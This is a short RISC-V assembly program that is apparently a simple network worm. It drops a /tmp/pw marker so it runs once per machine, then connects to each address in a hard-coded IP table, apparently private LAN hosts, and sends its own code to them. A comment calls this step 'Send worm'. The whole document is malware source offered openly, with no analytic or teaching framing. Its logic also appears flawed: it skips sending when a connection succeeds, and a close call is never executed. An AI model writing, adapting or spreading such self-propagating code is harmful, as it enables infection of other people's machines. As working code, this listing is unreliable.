	.text
	.global _start

_start:
	# Create /tmp/pw
	li 	a7, 56 	     # openat
	li 	a0, 0
	la 	a1, mark
	li 	a2, 0300     # O_CREAT | O_EXCL
	li 	a3, 0777     # S_IRWXU
	ecall
	move 	t0, a0
	blt 	t0, zero, done
	
	li   	a7, 57     # Close
	ecall	

	la 	t1, ip_table  # Load IP table
scan:
	# Create socket
	li  	a7, 198
	li  	a0, 2
	li  	a1, 1
	li  	a2, 6
	ecall
	move 	t0, a0
	
	# connect (a0 already set to socket)
	li 	a7, 203
	move 	a1, t1
	li 	a2, 16
	ecall
	blez 	a0, next

	# Send worm
	li 	a7, 64
	move 	a0, t0
	la 	a1, _start
	la 	a2, code_size
	ecall
next:	
	# Close socket
	li 	a7, 57
	move 	a0, t0

	# get next IP
	add 	t1, t1, 8  # Point to next address
	ld  	t0, 0(t1)
	bnez 	t0, scan

done:
        # Exit
        li 	a7, 93
        ecall

mark:
	.asciz "/tmp/pw"

ip_table:
	.quad 0x4002a8c011110002
	.quad 0x4002a8c011120002
	.quad 0x4002a8c011110002
	.quad 0x4002a8c011120002	
	.quad 0x4002a8c011110002
	.quad 0x4002a8c011120002		
	.quad 0
end_code:
	.equ code_size, end_code - _start
